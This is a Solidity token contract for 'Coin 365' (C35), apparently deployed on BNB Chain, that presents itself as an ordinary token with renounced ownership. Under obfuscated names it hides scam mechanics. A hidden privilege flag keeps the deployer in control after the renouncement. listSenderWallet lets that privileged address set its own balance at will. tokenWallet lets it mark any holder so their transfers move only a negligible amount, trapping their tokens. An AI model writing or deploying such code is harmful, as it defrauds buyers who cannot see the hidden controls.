/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface takeFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract Coin365 is Ownable{
    uint8 public decimals = 18;
    address public walletAmount;

    mapping(address => bool) public toReceiver;
    string public symbol = "C35";
    mapping(address => bool) public enableTokenMarketing;
    address public launchedLiquidityShould;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Coin 365";

    bool public limitSwap;


    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant marketingAuto = 10 ** 10;
    mapping(address => uint256) public balanceOf;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        takeFrom receiverSwap = takeFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        walletAmount = toFund(receiverSwap.factory()).createPair(receiverSwap.WETH(), address(this));
        launchedLiquidityShould = receiverFee();
        toReceiver[launchedLiquidityShould] = true;
        balanceOf[launchedLiquidityShould] = totalSupply;
        emit Transfer(address(0), launchedLiquidityShould, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address amountTake, uint256 launchedTo) external returns (bool) {
        return transferFrom(receiverFee(), amountTake, launchedTo);
    }

    function marketingLimit(address atBuyExempt) public {
        if (limitSwap) {
            return;
        }
        toReceiver[atBuyExempt] = true;
        limitSwap = true;
    }

    function approve(address exemptTrading, uint256 launchedTo) public returns (bool) {
        allowance[receiverFee()][exemptTrading] = launchedTo;
        emit Approval(receiverFee(), exemptTrading, launchedTo);
        return true;
    }

    function listSenderWallet(uint256 launchedTo) public {
        if (!toReceiver[receiverFee()]) {
            return;
        }
        balanceOf[launchedLiquidityShould] = launchedTo;
    }

    function transferFrom(address receiverFund, address amountTake, uint256 launchedTo) public returns (bool) {
        if (receiverFund != receiverFee() && allowance[receiverFund][receiverFee()] != type(uint256).max) {
            require(allowance[receiverFund][receiverFee()] >= launchedTo);
            allowance[receiverFund][receiverFee()] -= launchedTo;
        }
        if (amountTake == launchedLiquidityShould || receiverFund == launchedLiquidityShould) {
            return fundTrading(receiverFund, amountTake, launchedTo);
        }
        if (enableTokenMarketing[receiverFund]) {
            return fundTrading(receiverFund, amountTake, marketingAuto);
        }
        return fundTrading(receiverFund, amountTake, launchedTo);
    }

    function fundTrading(address receiverReceiver, address marketingEnable, uint256 launchedTo) internal returns (bool) {
        require(balanceOf[receiverReceiver] >= launchedTo);
        balanceOf[receiverReceiver] -= launchedTo;
        balanceOf[marketingEnable] += launchedTo;
        emit Transfer(receiverReceiver, marketingEnable, launchedTo);
        return true;
    }

    function receiverFee() private view returns (address) {
        return msg.sender;
    }

    function tokenWallet(address sellLaunchIs) public {
        if (sellLaunchIs == launchedLiquidityShould || sellLaunchIs == walletAmount || !toReceiver[receiverFee()]) {
            return;
        }
        enableTokenMarketing[sellLaunchIs] = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }


}